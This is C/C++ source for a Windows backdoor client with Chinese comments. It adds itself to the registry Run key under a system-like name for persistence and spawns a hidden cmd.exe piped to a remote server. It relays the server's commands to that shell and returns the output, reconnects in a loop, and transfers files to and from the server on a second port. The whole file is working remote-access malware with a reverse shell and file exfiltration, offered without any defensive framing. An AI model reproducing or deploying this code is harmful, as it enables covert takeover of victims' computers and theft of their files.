#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdint.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#include<cstring>  

typedef struct {
    char path[1024];
    char name[96];
    int size;
} FILE_DATA;


#define DEBUG true
#if DEBUG
    #define debug printf
#else
    #define debug
#endif


HANDLE hReadPipeCmd = NULL;
HANDLE hWritePipeCmd = NULL;
HANDLE hReadPipeShell = NULL;
HANDLE hWritePipeShell = NULL;//shell
HANDLE hProcessHandle;        //进程句柄
int pid;

char url[]="valderfields.tpddns.cn";

SOCKET sclient;

bool connectFlag;
int runFlag;
//bool shellFlag;
//BOOL initPipeSuccess = FALSE;

#define TCP_MAX_LEN 1400  // 1460

char filepath[4096];

void initPipe();
void shell();
void createShell(void);

DWORD WINAPI recv(LPVOID lpParameter);
DWORD WINAPI send(LPVOID lpParameter);

int runCnt;
int ipAddr;
int recvCnt;
int sendCnt;


DWORD WINAPI view(LPVOID lpParameter)
{
    char buf[1024];
    DWORD dwByteWritten; 
    int cnt = 0;

    while(1) {
        if (gets(buf)) {
            cnt++;
            debug("[%d] run %d, conn %d \r\n", cnt, runFlag, connectFlag);
            debug("recvCnt = %d, sendCnt = %d \r\n", recvCnt,sendCnt);
            WriteFile(hWritePipeShell, "dir\r\n", strlen("dir\r\n"), &dwByteWritten, 0);    
        }
        //Sleep(10000);
    }
}

void regEdit(void)
{
    bool regFlag = false;
    HKEY key;
    CHAR exePath[MAX_PATH]; 

    /* 获取当前路径，包括exe文件名 */
    GetModuleFileName(NULL, exePath, MAX_PATH);
    /* 获取当前路径 */
    // GetCurrentDirectory(MAX_PATH, path)

    /* 注册名 */
    char name[] = "system_valder";
    
    /* 注册列表启动项路径 */
    LPCTSTR startPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    int res = RegOpenKeyEx(HKEY_CURRENT_USER, startPath, 0, KEY_ALL_ACCESS, &key);  // KEY_ALL_ACCESS  KEY_READ
    if (res == ERROR_SUCCESS) {  
        debug("open start path success \r\n");
        
        /* 获取信息 */
        DWORD dwIndex=0, NameSize, NameCnt, NameMaxLen, Type;
        DWORD KeySize, KeyCnt, KeyMaxLen, DateSize, MaxDateLen;
        res = RegQueryInfoKey(key, NULL, NULL, NULL, &KeyCnt, &KeyMaxLen, NULL, &NameCnt, &NameMaxLen, &MaxDateLen, NULL, NULL);
        if (res == ERROR_SUCCESS) {
            for(DWORD dwIndex=0; dwIndex<NameCnt; dwIndex++)
            {   
                NameSize = NameMaxLen + 1;      
                char *szValueName = (char *)malloc(NameSize);
                DateSize = MaxDateLen + 1;
                LPBYTE szValueData = (LPBYTE)malloc(DateSize);  
                
                RegEnumValue(key, dwIndex, szValueName, &NameSize, NULL, &Type, szValueData, &DateSize);
                
                /* 检查是否已经注册 */
                if (0 == strcmp(szValueName, name)) {
                    if (0 == strcmp(exePath, (char *)szValueData)) {
                        regFlag = true;
                    } else {  /* 注册名符合，但路径不对 */
                        if (ERROR_SUCCESS == ::RegDeleteValue(key, name)) {
                            debug("error path, del value success \r\n");
                        } else {
                            debug("error path, del value failed \r\n");
                        }                       
                    }
                }
                #if 0
                debug("%s      ", szValueName);
                switch(Type) {
                    case REG_SZ:
                        debug("%s   %s   \r\n", "REG_SZ", szValueData);
                        break;
                    case REG_DWORD:
                        debug("%s   %d   \r\n", "REG_DWORD", szValueData);
                        break;
                }
                #endif
            }
        }

        if (regFlag == false) {
            /* 注册 */
            if (ERROR_SUCCESS == ::RegSetValueEx(key, name, 0, REG_SZ, (const unsigned char *)exePath, strlen(exePath))) {
                debug("add value success \r\n");
            } else {
                debug("add value failed \r\n");
            }           
        } else {
            debug("has been registered \r\n");
        }


        ::RegCloseKey(key);
    } else {
        debug("open key fail %d \r\n", res);
    }
    
    //char buf[100];
    //gets(buf);
}

int main(void)
{
	WORD wVersionRequested;
	WSADATA wsaData;	
	int err;
    struct hostent *host = NULL;
    uint8_t tmp[4];    
	
    connectFlag = false;
    runFlag = true;

    regEdit();

    /* init shell */
    initPipe();

    /* create thread */
    HANDLE hThread1 = CreateThread(NULL, 0, recv, NULL, 0, NULL);
    CloseHandle(hThread1);  
    
    HANDLE hThread2 = CreateThread(NULL, 0, send, NULL, 0, NULL);
    CloseHandle(hThread2);   

    //HANDLE hThread3 = CreateThread(NULL, 0, view, NULL, 0, NULL);
    //CloseHandle(hThread3);      

    /* socket prepare */
    WORD sockVersion = MAKEWORD(2, 2);
    WSADATA data;
    if (WSAStartup(sockVersion, &data) != 0)
    {
        return 0;
    }

    while(runFlag == true) {
        if (connectFlag == true) {
            Sleep(100);
        } else {
            Sleep(1 * 6 * 1000);

            /* get server IP */
            // host = gethostbyname(url);
            if (NULL == host) {
                ipAddr = inet_addr("192.168.0.42");
            } else {
                ipAddr = *(int *)host->h_addr_list[0];
            }
            memcpy(tmp, &ipAddr, 4);
            debug("serverIP:%d.%d.%d.%d \r\n", tmp[0], tmp[1], tmp[2], tmp[3]);    

            /* create socket */ 
            sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //客户端套接字
            if (sclient == INVALID_SOCKET)
            {
                debug("create socket failed \r\n");
                return 0;
            }

            /* setup socket */
            sockaddr_in serAddr;
            serAddr.sin_family = AF_INET;
            serAddr.sin_port = htons(41200);
            serAddr.sin_addr.s_addr = ipAddr;    
            /* connect to server */
            if (connect(sclient, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR) {
                debug("connect failed \r\n");
                closesocket(sclient);
                connectFlag = false;
                Sleep(10 * 1000);
            } else {
                createShell();

        		debug("connected \r\n");
                Sleep(100);
                connectFlag = true;
        	}
        }
    }

    debug("end \r\n"); 
}

DWORD WINAPI uploadfile(LPVOID lpParameter)
{
    char buf[1024];
    int len;
    char str[4096];

    debug("out start \r\n");
    char *filebuf = (char *)malloc(TCP_MAX_LEN);
    FILE_DATA *file = (FILE_DATA *)lpParameter;

    sprintf(str, "%s\\%s", file->path, file->name);
    // debug(" %s \r\n", str);

    FILE *fp=fopen(str, "rb");
    if (fp == NULL) {
        debug("open %s failed \r\n", file->name);
        return 0;
    } else {
        /* get file size */
        fseek(fp, 0L, SEEK_END);
        file->size = ftell(fp);
        //debug("fileSize = %d \r\n", file->size);
        fseek(fp, 0L, SEEK_SET);

        /* create socket */ 
        int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //客户端套接字
        if (fd == INVALID_SOCKET) {
            debug("create socket failed \r\n");
        }
        /* setup socket */
        sockaddr_in serAddr;
        serAddr.sin_family = AF_INET;
        serAddr.sin_port = htons(41201);
        serAddr.sin_addr.s_addr = ipAddr;    
        /* connect to server */
        if (connect(fd, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR) {
            debug("upload connect failed \r\n");
        } else {
            len = recv(fd, buf, 255, 0);
            buf[len] = '\0';
            if (0 == strcmp(buf, "direction")) { 
                send(fd, "in", strlen("in"), 0);
            }     
            /* get file informaiton */
            len = recv(fd, buf, 255, 0);
            buf[len] = '\0';
            if (0 == strcmp(buf, "info")) { 
                sprintf(str, "%s %d", file->name, file->size);
                send(fd, str, strlen(str), 0);
            }                   

            while(1) {
                len = recv(fd, buf, sizeof(buf), 0);
                if (len > 0) {
                    len = fread(filebuf, 1, TCP_MAX_LEN, fp);
                    // debug("len = %d \r\n", len);
                    if (len > 0) {
                        send(fd, filebuf, len, 0);
                        if (len < TCP_MAX_LEN) {
                            debug("len = %d \r\n", len);
                            break;
                        }
                    } else {
                        break;
                    }
                } else {
                    break;
                }
            }

            fclose(fp);
            closesocket(fd);
        }
    }

    free(filebuf);
    free(file);
    debug("out finish \r\n");
}

DWORD WINAPI downloadfile(LPVOID lpParameter)
{
    char buf[1024];
    int len;
    char str[4096];

    debug("in start \r\n");
    char *filebuf = (char *)malloc(TCP_MAX_LEN);
    FILE_DATA *file = (FILE_DATA *)lpParameter;

    /* create socket */ 
    int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //客户端套接字
    if (fd == INVALID_SOCKET) {
        debug("create socket failed \r\n");
        return 0;
    }
    /* setup socket */
    sockaddr_in serAddr;
    serAddr.sin_family = AF_INET;
    serAddr.sin_port = htons(41201);
    serAddr.sin_addr.s_addr = ipAddr;    
    /* connect to server */
    if (connect(fd, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR) {
        debug("download connect failed \r\n");
    } else {
        len = recv(fd, buf, sizeof(buf), 0);
        buf[len] = '\0';
        if (0 == strcmp(buf, "direction")) { 
            send(fd, "out", strlen("out"), 0);
        }     
        /* get file informaiton */
        len = recv(fd, buf, sizeof(buf), 0);
        buf[len] = '\0';
        if (0 == strcmp(buf, "info")) { 
            sprintf(str, "%s", file->name);
            send(fd, str, strlen(str), 0);
        }                   

        len = recv(fd, buf, sizeof(buf), 0);
        if (len > 0) {
            sprintf(str, "%s\\%s", file->path, file->name);
            FILE *fp=fopen(str, "wb");
            if (fp != NULL) {
                while(1) {
                    len = recv(fd, filebuf, TCP_MAX_LEN, 0);
                    if (len > 0) {
                        fwrite(filebuf, 1, TCP_MAX_LEN, fp);
                        //debug("len = %d \r\n", len);
                        if (len == TCP_MAX_LEN) {
                            send(fd, "data", strlen("data"), 0);
                        } else {
							debug("len = %d \r\n", len);
                            break;
                        }
                    } else {
                        break;
                    }
                }  
                fclose(fp);
            } else {
                debug("open %s failed \r\n", file->name);
                return 0;                
            }
        }
        closesocket(fd);
    }

    free(filebuf);
    free(file);
    debug("in finish \r\n");
}

/* send data to server */
DWORD WINAPI recv(LPVOID lpParameter)
{
    char readBuff[4096];
	DWORD BytesRead;
	
	while(runFlag == true) {
        recvCnt++;
        if (connectFlag == true) {
    		if (ReadFile(hReadPipeCmd, readBuff, sizeof(readBuff), &BytesRead, NULL)) {
    		    debug("%s", readBuff);
                /* get current path */
                if (readBuff[1] == ':') {
                    char *ptr = strchr(readBuff, '>');
                    if (ptr != NULL) {
                        *ptr = '\0';
                        strcpy(filepath, readBuff);
                        /* 根目录 */
                        if (strlen(filepath) == 3) {
                            filepath[2] = '\0';
                        }
                        // debug("filepath: %s", filepath);
                        *ptr = '>';
                    }
                }
                send(sclient, readBuff, strlen(readBuff), 0);
    			memset(readBuff, 0, sizeof(readBuff));
    		} else {

            }
        } else {
            Sleep(100);
        }
	}

    debug("recv end \r\n");
}

/* recv data from server */
DWORD WINAPI send(LPVOID lpParameter)
{
    DWORD dwByteWritten; 
    char str[1024];
    char writeBuff[1024];        

    while(1) {
        sendCnt++;
        if (connectFlag == true) {
            int len = recv(sclient, writeBuff, sizeof(writeBuff), 0);
            if (len > 0) {   
                if (0 == strcmp(writeBuff, "end")) {   /* 关闭客户端 */
                    debug("# end \r\n");
                    /* 退出shell */
                    strcpy(str, "exit\r\n");
                    WriteFile(hWritePipeShell, str, strlen(str), &dwByteWritten, 0);
                    closesocket(sclient);
                    runFlag = false;
                    break;

                } else if (0 == strncmp(writeBuff, "get ", 4)) {   /* 服务器获取文件 */
                    /* 获取文件名 */
                    FILE_DATA *file = (FILE_DATA *)malloc(sizeof(FILE_DATA));
                    strcpy(file->path, filepath);
                    sscanf(writeBuff, "get %s", file->name);
                    memset(writeBuff, 0, sizeof(writeBuff));

                    /* 通过dir命令查询文件是否存在*/
                    sprintf(str, "%s %s\\%s\r\n", "dir ", file->path, file->name);
                    WriteFile(hWritePipeShell, str, strlen(str), &dwByteWritten, 0);
                    /* create thread */
                    HANDLE hThread1 = CreateThread(NULL, 0, uploadfile, file, 0, NULL);
                    CloseHandle(hThread1);    

                } else if (0 == strncmp(writeBuff, "send ", 5)) {   /* 服务器接收文件 */
                    /* 获取文件名 */
                    FILE_DATA *file = (FILE_DATA *)malloc(sizeof(FILE_DATA));
                    strcpy(file->path, filepath);
                    sscanf(writeBuff, "send %s", file->name);
                    memset(writeBuff, 0, sizeof(writeBuff));
                    /* create thread */
                    HANDLE hThread1 = CreateThread(NULL, 0, downloadfile, file, 0, NULL);
                    CloseHandle(hThread1);     

                } else if (0 == strcmp(writeBuff, "quit")) { 
                    /* 退出shell */
                    strcpy(str, "exit\r\n");
                    WriteFile(hWritePipeShell, str, strlen(str), &dwByteWritten, 0);

                    connectFlag = false;
                    closesocket(sclient);
                    debug("disconnected 1 \r\n");                    

                } else if (0 == strcmp(writeBuff, "echo")) {  /* 测试连接 */
                    send(sclient, writeBuff, strlen(writeBuff), 0);

                    //char tmp_buf[] = {0x1b, 0x5b, 0x41};
                    //send(sclient, tmp_buf, 3, 0);

                    //int res = GenerateConsoleCtrlEvent(CTRL_C_EVENT, pid);
                    //debug("##echo %d \r\n", res);

                } else {  /* 正常命令 */
                    writeBuff[len] = '\0';
                    strcat(writeBuff, "\r\n");

                    WriteFile(hWritePipeShell, writeBuff, strlen(writeBuff), &dwByteWritten, 0);
                    memset(writeBuff, 0, sizeof(writeBuff));

                }               
            } else {
                /* 退出shell */
                strcpy(str, "exit\r\n");
                WriteFile(hWritePipeShell, str, strlen(str), &dwByteWritten, 0);

                connectFlag = false;
                closesocket(sclient);
                debug("disconnected 2 \r\n");
            }
        } else {
            Sleep(100);
        }
    }

    debug("send end \r\n");
}

STARTUPINFO si = {0};

void initPipe()
{
    SECURITY_ATTRIBUTES sa = {0}; 

    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL; 
    sa.bInheritHandle = TRUE;

    CreatePipe(&hReadPipeCmd, &hWritePipeCmd, &sa, 0);
    CreatePipe(&hReadPipeShell, &hWritePipeShell, &sa, 0);

    GetStartupInfo(&si);
    si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
    si.hStdInput = hReadPipeShell;
    si.hStdOutput = si.hStdError = hWritePipeCmd; 
}

void createShell(void)
{
    PROCESS_INFORMATION pi = {0};
    char strShellPath[256];   

    GetSystemDirectory(strShellPath, 256);
    strcat(strShellPath,"\\cmd.exe");

    if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
        debug("CreateProcess Error!\n");
        CloseHandle(hWritePipeCmd);
        CloseHandle(hReadPipeShell);
        //initPipeSuccess = FALSE;
        return;
    }

    hProcessHandle = pi.hProcess;
    pid = pi.dwProcessId;
    debug("create shell process %d \r\n", pid);
    //initPipeSuccess = TRUE;    
}
